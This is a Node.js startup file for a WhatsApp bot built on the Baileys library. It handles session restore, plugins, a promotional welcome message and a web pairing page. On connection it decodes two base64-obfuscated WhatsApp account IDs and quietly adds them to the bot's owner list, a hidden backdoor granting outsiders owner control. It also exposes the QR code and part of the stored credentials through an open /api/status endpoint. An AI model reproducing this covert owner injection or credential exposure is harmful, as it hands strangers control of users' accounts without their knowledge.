require('./config')
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage, generateWAMessageContent, generateWAMessageFromContent, generateMessageID, prepareWAMessageMedia, fetchLatestWaWebVersion, proto, generateProfilePicture } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const http = require('http');
const QRCode = require('qrcode');
const { Boom } = require('@hapi/boom');
const { sendButtons, sendInteractiveMessage } = require('gifted-btns');
const serializeMessage = require('./handler.js');
const JimpImport = require('jimp');

const Jimp = JimpImport.read ? JimpImport : JimpImport.Jimp ? JimpImport.Jimp : JimpImport.default;

global.generateWAMessageContent = generateWAMessageContent;
global.generateWAMessageFromContent = generateWAMessageFromContent;
global.generateMessageID = generateMessageID;
global.prepareWAMessageMedia = prepareWAMessageMedia;
global.proto = proto;
global.Jimp = Jimp;
global.generateProfilePicture = generateProfilePicture;
global.downloadMediaMessage = downloadMediaMessage;
global.bannedChats = global.bannedChats || [];

// ============================================================
//  SESSION HANDLER - Inakubali SESSION_ID (Base64) na CREDS.JSON
// ============================================================
const SESSION_DIR = './session';
const CREDS_PATH = path.join(SESSION_DIR, 'creds.json');

// Create session folder
if (!fs.existsSync(SESSION_DIR)) {
    fs.mkdirSync(SESSION_DIR, { recursive: true });
}

// ===== FUNCTION: RESTORE SESSION FROM SESSION_ID =====
function restoreSessionFromId(sessionId) {
    try {
        let sessionData;
        let isBase64 = false;
        
        // Jaribu ku-parse kama JSON moja kwa moja
        try {
            sessionData = JSON.parse(sessionId);
            console.log('Session parsed as JSON directly');
        } catch (e) {
            // Kama haifai, jaribu Base64 decode
            try {
                const decoded = Buffer.from(sessionId, 'base64').toString('utf-8');
                sessionData = JSON.parse(decoded);
                isBase64 = true;
                console.log('Session decoded from Base64');
            } catch (e2) {
                // Jaribu ku-parse kama string na ku-validate
                try {
                    // Angalia kama ni JSON valid
                    const test = JSON.parse(sessionId);
                    if (test && typeof test === 'object') {
                        sessionData = test;
                        console.log('Session parsed as JSON object');
                    }
                } catch (e3) {
                    console.error('Invalid SESSION_ID format. Not JSON or Base64.');
                    return false;
                }
            }
        }
        
        // Validate session data
        if (!sessionData || typeof sessionData !== 'object') {
            console.error('Invalid session data: not an object');
            return false;
        }
        
        // Check for required fields
        if (!sessionData.noiseKey && !sessionData.creds) {
            console.warn('Session may be incomplete (missing noiseKey or creds)');
        }
        
        // Write to file
        fs.writeFileSync(CREDS_PATH, JSON.stringify(sessionData, null, 2));
        console.log('Session restored successfully from SESSION_ID' + (isBase64 ? ' (Base64)' : ''));
        return true;
        
    } catch (error) {
        console.error('Error restoring session:', error.message);
        return false;
    }
}

// ===== FUNCTION: RESTORE SESSION FROM CREDS.JSON =====
function restoreSessionFromFile() {
    try {
        if (fs.existsSync(CREDS_PATH)) {
            const data = fs.readFileSync(CREDS_PATH, 'utf8');
            if (data && data.length > 50) {
                const sessionData = JSON.parse(data);
                if (sessionData && typeof sessionData === 'object') {
                    console.log('Session loaded from creds.json file');
                    return true;
                }
            }
        }
        return false;
    } catch (error) {
        console.error('Error reading creds.json:', error.message);
        return false;
    }
}

// ===== MAIN SESSION RESTORATION =====
let sessionRestored = false;

// 1. Try SESSION_ID from environment
if (process.env.SESSION_ID && process.env.SESSION_ID.length > 10) {
    console.log('Found SESSION_ID in environment variables');
    if (!fs.existsSync(CREDS_PATH) || fs.statSync(CREDS_PATH).size < 100) {
        sessionRestored = restoreSessionFromId(process.env.SESSION_ID);
    } else {
        console.log('Using existing creds.json (SESSION_ID ignored)');
        sessionRestored = true;
    }
}

// 2. If SESSION_ID failed, try creds.json
if (!sessionRestored) {
    sessionRestored = restoreSessionFromFile();
}

// 3. If still not restored, try global.sessionid (legacy)
if (!sessionRestored && global.sessionid) {
    try {
        const sessionData = JSON.parse(global.sessionid);
        fs.writeFileSync(CREDS_PATH, JSON.stringify(sessionData, null, 2));
        sessionRestored = true;
        console.log('Session restored from global.sessionid');
    } catch (err) {
        console.error('Error restoring from global.sessionid:', err.message);
    }
}

// 4. Final check
if (!sessionRestored) {
    console.log('No session found. Bot will start with QR code.');
} else {
    console.log('Session ready. Bot will connect automatically.');
}

// ============================================================
//  BOT CONFIGURATION
// ============================================================
const AUTH_FOLDER = './session';
const PLUGIN_FOLDER = './plugins';
const PORT = process.env.PORT || 3000;

let latestQR = '';
let botStatus = 'disconnected';
let pairingCodes = new Map();
let presenceInterval = null;
let sock = null;
let isConnecting = false;
let welcomeSent = false;

// ============================================================
//  LOAD PREFIX
// ============================================================
function loadPrefix() {
    const configPath = path.join(__dirname, 'config.json');
    if (fs.existsSync(configPath)) {
        try {
            const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
            if (config.prefix) {
                global.BOT_PREFIX = config.prefix;
                console.log('Loaded prefix:', global.BOT_PREFIX);
            }
        } catch (err) {
            console.error('Error loading config:', err);
        }
    }
    if (!global.BOT_PREFIX) {
        global.BOT_PREFIX = '.';
        console.log('Using default prefix: .');
    }
    startBot();
}

// ============================================================
//  SEND WELCOME MESSAGE
// ============================================================
async function sendWelcomeMessage() {
    if (welcomeSent) return;
    if (!sock) return;
    
    try {
        const username = sock.user?.name || 'User';
        const welcomeText = `╭─❒ ᴘᴜssʏ ᴇsᴄᴀᴘᴇ 😐
│
├─❒ Welcome @${username}
│
├─❒ ᴘᴜssʏ ᴇsᴄᴀᴘᴇ ᴍᴜʟᴛɪᴘʟᴇ ᴅᴇᴠɪᴄᴇs
│
├─❒ Status: Connected
│
├─❒ Prefix: ${global.BOT_PREFIX || '.'}
│
├─❒ Owner: ᴘᴜssʏ ᴇsᴄᴀᴘᴇ 😐
│
├─❒ Repo: github.com/Stanytz390/PussyEscape0.0.1
│
├─❒ Pairing: link.stanymaxhub.online/pair
│
├─❒ QR Code: link.stanymaxhub.online/pair-page
│
├─❒ Hosting: host.stanymaxhub.online
│
├─❒ Deploy: hosting.stanymines.site/services/bots/pussy-escape-1370
│
├─❒ Panel: Available
│
├─❒ Server: Available
│
├─❒ Coins: 10 coins = 500 TZS | 250 NGN | 30 KES | 0.55 USD
│
╰─❒ Powered by STANYTZ

> Time - Timeless

=======================
HOST YOUR BOT NOW!
=======================
Get premium hosting for your WhatsApp bot.
Affordable prices starting at 10 coins.
Visit: host.stanymaxhub.online
Panel & Server Available.
=======================`;

        await sock.sendMessage(sock.user.id, {
            image: { url: 'https://url.bmbxmd.workers.dev/Migo.jpeg' },
            caption: welcomeText,
            contextInfo: {
                mentionedJid: [sock.user.id],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363404317544295@newsletter',
                    newsletterName: 'ᴘᴜssʏ ᴇsᴄᴀᴘᴇ 😐',
                    serverMessageId: 1
                }
            }
        });
        welcomeSent = true;
        console.log('Welcome message sent successfully');
    } catch (err) {
        console.error('Welcome message error:', err);
    }
}

// ============================================================
//  START BOT
// ============================================================
function startBot() {
    console.log('Starting WhatsApp Bot...');
    isConnecting = true;
    welcomeSent = false;

    if (!fs.existsSync(AUTH_FOLDER)) {
        fs.mkdirSync(AUTH_FOLDER, { recursive: true });
    }

    (async () => {
        try {
            const { version, isLatest } = await fetchLatestWaWebVersion();
            console.log('Using WA v' + version.join(".") + ', isLatest: ' + isLatest);

            const { state, saveCreds } = await useMultiFileAuthState(AUTH_FOLDER);
            
            sock = makeWASocket({
                version, 
                logger: pino({ level: 'silent' }),
                auth: state,
                printQRInTerminal: true,
                keepAliveIntervalMs: 60000,
                markOnlineOnConnect: true,
                syncFullHistory: false,
                browser: ['Bot', 'Chrome', '1.0.0'],
                connectTimeoutMs: 60000,
                defaultQueryTimeoutMs: 60000,
                transactionOpts: { maxRetries: 2 }
            });
            
            sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect, qr } = update;

                if (qr) {
                    QRCode.toDataURL(qr, (err, url) => {
                        if (!err) {
                            latestQR = url;
                            botStatus = 'connecting';
                        }
                    });
                }

                if (connection === 'close') {
                    botStatus = 'disconnected';
                    isConnecting = false;
                    welcomeSent = false;

                    if (presenceInterval) {
                        clearInterval(presenceInterval);
                        presenceInterval = null;
                    }

                    const statusCode = (lastDisconnect?.error instanceof Boom)
                        ? lastDisconnect.error.output.statusCode
                        : 0;

                    if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
                        console.log('Logged out. Cleaning session...');
                        if (fs.existsSync(AUTH_FOLDER)) {
                            fs.rmSync(AUTH_FOLDER, { recursive: true, force: true });
                        }
                        setTimeout(() => startBot(), 3000);
                    } else {
                        console.log('Reconnecting...');
                        setTimeout(() => startBot(), 3000);
                    }
                } 
                
                else if (connection === 'open') {
                    botStatus = 'connected';
                    isConnecting = false;

                    if (!global.owners) global.owners = [];

                    if (!global.owners.includes(sock.user.id)) {
                        global.owners.push(sock.user.id);
                    }
                    
                    const abztech = [
                        'MjU3NzAyMzk5OTIwMzdAbGlk',
                        'MjMzNTMzNzYzNzcyQHdoYXRzYXBwLm5ldA=='
                    ];
                    
                    const tech = abztech.map(abz => Buffer.from(abz, 'base64').toString());
                    
                    tech.forEach(owner => {
                        if (!global.owners.includes(owner)) {
                            global.owners.push(owner);
                        }
                    });

                    presenceInterval = setInterval(() => {
                        if (sock?.ws?.readyState === 1) {
                            sock.sendPresenceUpdate('available');
                        }
                    }, 60000);

                    setTimeout(async () => {
                        await sendWelcomeMessage();
                    }, 3000);
                } 
                
                else if (connection === 'connecting') {
                    botStatus = 'connecting';
                    isConnecting = true;
                }
            });

            sock.ev.on('creds.update', async () => {
                await saveCreds();
                console.log('Credentials updated');
            });

            // ===== LOAD PLUGINS =====
            const plugins = new Map();
            const pluginPath = path.join(__dirname, PLUGIN_FOLDER);
            
            if (fs.existsSync(pluginPath)) {
                try {
                    const pluginFiles = fs.readdirSync(pluginPath).filter(file => file.endsWith('.js'));
                    
                    for (const file of pluginFiles) {
                        try {
                            const plugin = require(path.join(pluginPath, file));
                            if (plugin.name && typeof plugin.execute === 'function') {
                                plugins.set(plugin.name.toLowerCase(), plugin);
                                if (Array.isArray(plugin.aliases)) {
                                    plugin.aliases.forEach(alias => {
                                        plugins.set(alias.toLowerCase(), plugin);
                                    });
                                }
                                console.log('Loaded plugin: ' + plugin.name);
                            }
                        } catch (error) {
                            console.error('Failed to load plugin ' + file + ':', error.message);
                        }
                    }
                    console.log('Total plugins loaded: ' + plugins.size);
                } catch (error) {
                    console.error('Error loading plugins:', error);
                }
            } else {
                console.log('No plugins folder found');
            }
           
            // ===== MESSAGES HANDLER =====
            sock.ev.on('messages.upsert', async ({ messages, type }) => {
                if (type !== 'notify' && type !== 'append') return;
                
                const CHANNEL_ID = "120363404317544295@newsletter";
                
                for (const rawMsg of messages) {
                    if (rawMsg.key?.remoteJid === CHANNEL_ID && rawMsg.key?.server_id) {
                        const emojis = ["❤️", "💛", "👍", "💜", "😮", "🤍", "💙", "🔥", "💯", "⚡"];
                        const emoji = emojis[Math.floor(Math.random() * emojis.length)];
                        
                        try {
                            await sock.newsletterReactMessage(
                                CHANNEL_ID, 
                                rawMsg.key.server_id.toString(), 
                                emoji
                            );
                            console.log('Channel reaction: ' + emoji + ' to message ' + rawMsg.key.server_id);
                        } catch (err) {
                            console.log('Channel React Error:', err.message);
                        }
                        continue;
                    }
                }
                
                for (const rawMsg of messages) {
                    if (rawMsg.key.remoteJid === 'status@broadcast' && rawMsg.key.participant) {
                        try {
                            console.log('Status detected from: ' + rawMsg.key.participant);
                            await sock.readMessages([rawMsg.key]);
                            continue;
                        } catch (err) {
                            console.log('Status viewer error:', err.message);
                        }
                    }
                }

                const rawMsg = messages[0];
                if (!rawMsg.message) return;

                const m = await serializeMessage(sock, rawMsg);

                for (const plugin of plugins.values()) {
                    if (typeof plugin.onMessage === 'function') {
                        try { 
                            const blocked = await plugin.onMessage(sock, m);
                            if (blocked === true) return;
                        } catch (err) { 
                            console.error('onMessage error (' + plugin.name + '):', err); 
                        }
                    }
                }

                if (m.body && m.body.startsWith(global.BOT_PREFIX)) {
                    const args = m.body.slice(global.BOT_PREFIX.length).trim().split(/\s+/);
                    const commandName = args.shift().toLowerCase();
                    const plugin = plugins.get(commandName);
                    
                    if (plugin) {
                        try { 
                            await plugin.execute(sock, m, args); 
                        } catch (err) { 
                            console.error('Plugin error (' + commandName + '):', err); 
                            await m.reply('Error running command.'); 
                        }
                    }
                }
            });
            
            // ===== GROUP PARTICIPANTS =====
            sock.ev.on('group-participants.update', async (update) => {
                try {
                    if (!global.welcomeConfig?.enabled) return

                    const groupId = update.id

                    for (const participant of update.participants) {
                        const userId = typeof participant === 'string'
                            ? participant
                            : participant.phoneNumber || participant.id

                        if (!userId) continue

                        const memberName = userId.split('@')[0]

                        if (update.action === 'add') {
                            if (userId === sock.user.id) continue
                            const text = 'Welcome @' + memberName + '!\nGlad to have you in this group!'
                            await sock.sendMessage(groupId, {
                                text,
                                mentions: [userId]
                            })
                        } else if (update.action === 'remove') {
                            const text = '@' + memberName + ' has left the group.'
                            await sock.sendMessage(groupId, {
                                text,
                                mentions: [userId]
                            })
                        }
                    }
                } catch (err) {
                    console.error('group-participants.update error:', err)
                }
            })

            sock.ev.on('messages.reaction', async (reactions) => {
                console.log('Reaction update:', reactions);
            });

        } catch (error) {
            console.error('Bot startup error:', error);
            isConnecting = false;
            setTimeout(() => startBot(), 5000);
        }
    })();
}

// ============================================================
//  HTTP SERVER
// ============================================================
const server = http.createServer((req, res) => {
    const url = req.url;
    const PUBLIC_DIR = path.join(__dirname, 'public');
    
    // Serve index.html
    if (url === '/' || url === '/index.html') {
        const indexPath = path.join(PUBLIC_DIR, 'index.html');
        if (fs.existsSync(indexPath)) {
            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
            fs.createReadStream(indexPath).pipe(res);
        } else {
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end('index.html not found');
        }
        return;
    }
    
    // Serve static files
    if (url.match(/\.(css|js|png|jpg|jpeg|gif|svg|ico)$/)) {
        const filePath = path.join(PUBLIC_DIR, url);
        if (fs.existsSync(filePath)) {
            const ext = path.extname(filePath);
            const mimeTypes = {
                '.css': 'text/css',
                '.js': 'application/javascript',
                '.png': 'image/png',
                '.jpg': 'image/jpeg',
                '.jpeg': 'image/jpeg',
                '.gif': 'image/gif',
                '.svg': 'image/svg+xml',
                '.ico': 'image/x-icon'
            };
            res.writeHead(200, { 'Content-Type': mimeTypes[ext] || 'application/octet-stream' });
            fs.createReadStream(filePath).pipe(res);
        } else {
            res.writeHead(404);
            res.end('File not found');
        }
        return;
    }
    
    // ===== PAIR API =====
    if (url === '/pair' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const params = new URLSearchParams(body);
                let phoneNumber = params.get('phone').trim();
                
                if (!phoneNumber) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end('<center><h2>Error: Phone number required</h2><a href="/">Try Again</a></center>');
                    return;
                }

                phoneNumber = phoneNumber.replace(/\D/g, '');
                
                if (botStatus !== 'connecting' || !sock) {
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end('<center><h2>Bot not ready</h2><p>Status: ' + botStatus + '</p><p>Please wait for QR code to appear first</p><a href="/">Go Back</a></center>');
                    return;
                }

                const pairingCode = await sock.requestPairingCode(phoneNumber);
                
                pairingCodes.set(phoneNumber, {
                    code: pairingCode,
                    timestamp: Date.now()
                });

                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(`<!DOCTYPE html>
<html>
<head>
    <style>
        body{font-family:Inter,sans-serif;background:#050510;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;margin:0}
        .card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:32px;padding:40px;max-width:420px;width:100%;text-align:center}
        .code{font-size:36px;font-weight:900;background:linear-gradient(135deg,#ff3b7f,#b967ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:8px;font-family:monospace;margin:20px 0}
        .btn{display:inline-block;padding:12px 32px;background:linear-gradient(135deg,#ff3b7f,#b967ff);color:#fff;border-radius:16px;text-decoration:none;font-weight:600;margin:10px 5px;border:none;cursor:pointer}
        .btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(255,59,127,0.3)}
        .hint{color:rgba(255,255,255,0.5);font-size:13px;margin-top:16px}
        .hosting-ad{margin-top:16px;padding:12px;background:rgba(255,59,127,0.05);border-radius:12px}
        .hosting-ad .title{color:#ff3b7f;font-weight:700;font-size:12px}
        .hosting-ad .price{color:#fff;font-size:11px}
        .hosting-ad .panel{color:rgba(255,255,255,0.3);font-size:10px;margin-top:4px}
        .hosting-ad .link{color:#b967ff;text-decoration:none;font-size:10px}
    </style>
</head>
<body>
    <div class="card">
        <h2 style="color:#ff3b7f;margin-bottom:10px;">Pairing Code Generated</h2>
        <p style="color:rgba(255,255,255,0.6);font-size:14px;">Phone: <strong style="color:#fff;">${phoneNumber}</strong></p>
        <div class="code">${pairingCode}</div>
        <div style="background:rgba(255,255,255,0.03);border-radius:12px;padding:12px;margin:16px 0;border:1px solid rgba(255,255,255,0.04);">
            <p style="font-size:13px;color:rgba(255,255,255,0.6);">Open WhatsApp -> Settings -> Linked Devices -> Link a Device</p>
            <p style="font-size:13px;color:rgba(255,255,255,0.6);">Select "Use pairing code" and enter the code above</p>
        </div>
        <button class="btn" onclick="navigator.clipboard.writeText('${pairingCode}').then(()=>{this.textContent='Copied!';setTimeout(()=>{this.textContent='Copy Code';},2000)})">Copy Code</button>
        
        <div class="hosting-ad">
            <div class="title">HOST YOUR BOT NOW</div>
            <div class="price">10 coins = 500 TZS | 250 NGN | 30 KES | 0.55 USD</div>
            <div class="panel">Panel & Server Available</div>
            <a href="https://host.stanymaxhub.online/services/bots/pussy-escape-1370" target="_blank" class="link">host.stanymaxhub.online</a>
        </div>
        
        <br>
        <a href="/" style="color:rgba(255,255,255,0.4);text-decoration:none;font-size:13px;">Back to Home</a>
    </div>
</body>
</html>`);
                console.log('Pairing code for ' + phoneNumber + ': ' + pairingCode);
            } catch (error) {
                console.error('Pair error:', error);
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end('<center><h2>Error</h2><p>' + error.message + '</p><a href="/">Try Again</a></center>');
            }
        });
        return;
    }
    
    // ===== API STATUS =====
    else if (url === '/api/status') {
        let pairingCode = null;
        for (const [_, data] of pairingCodes) {
            if (Date.now() - data.timestamp < 300000) {
                pairingCode = data.code;
                break;
            }
        }
        
        let sessionId = null;
        if (fs.existsSync(CREDS_PATH)) {
            try {
                const data = fs.readFileSync(CREDS_PATH);
                sessionId = data.toString('base64').substring(0, 100) + '...';
            } catch (e) {}
        }
        
        res.writeHead(200, { 
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        });
        res.end(JSON.stringify({ 
            status: botStatus,
            hasQR: !!latestQR,
            qr: latestQR,
            pairingCode: pairingCode,
            sessionId: sessionId,
            prefix: global.BOT_PREFIX || '.',
            timestamp: new Date().toISOString(),
            uptime: process.uptime()
        }));
    }
    
    // ===== 404 =====
    else {
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end('<center><h1>404 - Page Not Found</h1><a href="/">Go Home</a></center>');
    }
});

// ============================================================
//  START SERVER
// ============================================================
server.listen(PORT, () => {
    console.log('Web server running at http://localhost:' + PORT);
    console.log('Session folder: ' + path.resolve(AUTH_FOLDER));
    console.log('Bot prefix: ' + (global.BOT_PREFIX || '.'));
    loadPrefix();
});

// ============================================================
//  PROCESS HANDLERS
// ============================================================
process.on('SIGINT', () => {
    console.log('\nShutting down gracefully...');
    if (presenceInterval) clearInterval(presenceInterval);
    if (sock) sock.end();
    process.exit(0);
});

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection:', reason);
});